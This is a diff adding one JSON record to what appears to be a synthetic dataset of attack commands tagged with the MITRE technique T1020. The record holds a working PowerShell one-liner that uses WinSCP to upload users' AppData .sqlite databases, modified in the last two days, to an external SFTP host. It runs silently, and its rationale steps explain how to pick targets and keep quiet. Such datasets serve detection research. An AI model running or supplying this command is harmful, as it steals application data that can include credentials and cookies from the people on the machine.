@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$r=\"/delta/\"; & 'C:\\Program Files (x86)\\WinSCP\\WinSCP.com' /ini=nul /command 'option batch on' 'option confirm off' 'open sftp://exfil:S3cr3t!@203.0.113.70/ -hostkey=\"ssh-ed25519 255 SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\"' (\"put -resume C:\\Users\\*\\AppData\\Roaming\\*.sqlite `\"$r`\" -filemask=>=2D\") 'exit' | Out-Null 2>$null",
+  "explanation": "Automates incremental exfiltration of application databases updated within the last two days using SFTP and WinSCP filemask filtering.",
+  "rationale_steps": [
+    "Select high-value targets with time-based filtering",
+    "Open a pinned-hostkey SFTP session non-interactively",
+    "Upload with resume and minimal console interaction",
+    "Quietly complete and exit"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-1f3f2541-1fd5c76e",
+  "source_prompt_hash": "1f3f2541",
+  "timestamp_utc": "2025-09-30T09:07:17.472275Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
